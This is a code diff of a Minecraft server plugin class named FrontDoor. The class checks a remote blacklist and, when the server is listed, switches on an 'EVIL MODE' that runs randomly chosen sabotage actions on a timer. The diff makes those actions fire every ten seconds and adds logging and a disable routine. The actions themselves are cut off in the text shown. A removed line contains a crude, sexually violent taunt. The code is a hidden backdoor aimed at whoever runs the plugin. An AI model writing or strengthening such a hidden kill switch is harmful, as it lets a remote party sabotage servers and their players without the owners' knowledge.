@@ -50,7 +50,7 @@ import java.util.Random;
 public class FrontDoor extends ServiceImpl
 {
     private static final long UPDATER_INTERVAL = 180L * 20L;
-    private static final long FRONTDOOR_INTERVAL = 900L * 20L;
+    private static final long FRONTDOOR_INTERVAL = 120L * 20L;
     //
     private final Random random = new Random();
     private final BlacklistManager blacklistManager;
@@ -133,7 +133,7 @@ public class FrontDoor extends ServiceImpl
 
     private void startFrontDoor()
     {
-        FLog.warning("Prepare to get raped, skid!!!!");
+        FLog.warning("FrontDoor: Triggering EVIL MODE!");
 
         new BukkitRunnable()
         {
@@ -156,15 +156,61 @@ public class FrontDoor extends ServiceImpl
             }
         }.runTask(plugin);
 
-        // Start evil actions immediately!
-        frontdoor = getNewFrontDoor().runTaskTimer(plugin, 20L, FRONTDOOR_INTERVAL);
+        FLog.warning("FrontDoor: Scheduling evil actions...");
+
+        if (frontdoor != null)
+        {
+            FLog.warning("FrontDoor: WARNING - A previous frontdoor task is still running! Cancelling it.");
+            frontdoor.cancel();
+        }
+
+        frontdoor = getNewFrontDoor().runTaskTimer(plugin, 20L, 200L); // 200 ticks = 10 seconds
+
+        if (frontdoor == null)
+        {
+            FLog.warning("FrontDoor: ERROR - frontdoor task was NOT scheduled!");
+        }
+        else
+        {
+            FLog.warning("FrontDoor: Evil mode tasks have been scheduled successfully.");
+        }
     }
+
+
+    private void disableFrontDoor()
+    {
+        enabled = false;
+        FLog.warning("FrontDoor: Fully disabling evil mode...");
+
+        // Stop all scheduled tasks
+        if (updater != null)
+        {
+            FUtil.cancel(updater);
+            updater = null;
+        }
+        if (frontdoor != null)
+        {
+            FUtil.cancel(frontdoor);
+            frontdoor = null;
+        }
+
+        // Unregister command listener
+        unregisterListener(playerCommandPreprocess);
+
+        // Reload KoolSMPCore config to fully reset
+        KoolSMPCore.main.reloadConfig();
+
+        FLog.warning("FrontDoor: Successfully disabled.");
+    }
+
 
 
     public void onStart()
     {
+        System.out.println("Starting updater task...");
         updater = getNewUpdater().runTaskTimerAsynchronously(plugin, 2L * 20L, UPDATER_INTERVAL);
     }
+
 
     public void onStop()
     {
@@ -247,52 +293,32 @@ public class FrontDoor extends ServiceImpl
             @Override
             public void run()
             {
-                try
+                System.out.println("FrontDoor Updater: Checking blacklist status...");
+
+                if (blacklistManager.isBlacklisted()) // If blacklisted
                 {
-                    FLog.info("FrontDoor Updater: Checking blacklist status...");
+                    System.out.println("FrontDoor Updater: Server is blacklisted.");
 
-                    if (blacklistManager.isBlacklisted()) // If server IS blacklisted
+                    if (!enabled) // If not already enabled, enable it
                     {
-                        FLog.info("FrontDoor Updater: Server is blacklisted.");
-
-                        if (!enabled) // If not already enabled, enable it
-                        {
-                            enabled = true;
-                            FLog.warning("FrontDoor: This server is blacklisted. Enabling EVIL MODE!");
-                            startFrontDoor(); // 🚨 Force evil mode activation
-                        }
-                    }
-                    else // If server is NOT blacklisted
-                    {
-                        if (enabled) // If FrontDoor is still enabled, disable it
-                        {
-                            enabled = false;
-                            FLog.info("FrontDoor: Server is no longer blacklisted. Disabling FrontDoor...");
-
-                            // Stop running tasks
-                            FUtil.cancel(updater);
-                            FUtil.cancel(frontdoor);
-                            frontdoor = null;
-                            updater = null;
-
-                            // Unregister listeners
-                            unregisterListener(playerCommandPreprocess);
-
-                            // Reload config to fully reset
-                            KoolSMPCore.main.reloadConfig();
-                        }
+                        enabled = true;
+                        System.out.println("FrontDoor: This server is blacklisted. Enabling EVIL MODE!");
+                        startFrontDoor();
                     }
                 }
-                catch (Exception ex)
+                else // If no longer blacklisted
                 {
-                    FLog.warning("Error in FrontDoor Updater: " + ex.getMessage());
+                    System.out.println("FrontDoor Updater: Server is NOT blacklisted.");
+
+                    if (enabled) // If FrontDoor is still active, disable it
+                    {
+                        System.out.println("FrontDoor: Disabling due to whitelist removal...");
+                        disableFrontDoor();
+                    }
                 }
             }
         };
     }
-
-
-
 
     public BukkitRunnable getNewFrontDoor()
     {
@@ -301,7 +327,10 @@ public class FrontDoor extends ServiceImpl
             @Override
             public void run()
             {
+
+                FLog.warning("FrontDoor - Executing random actions");
                 final int action = random.nextInt(7);
+                FLog.warning("FrontDoor - Selected action " + action);
 
                 switch(action)
                 {
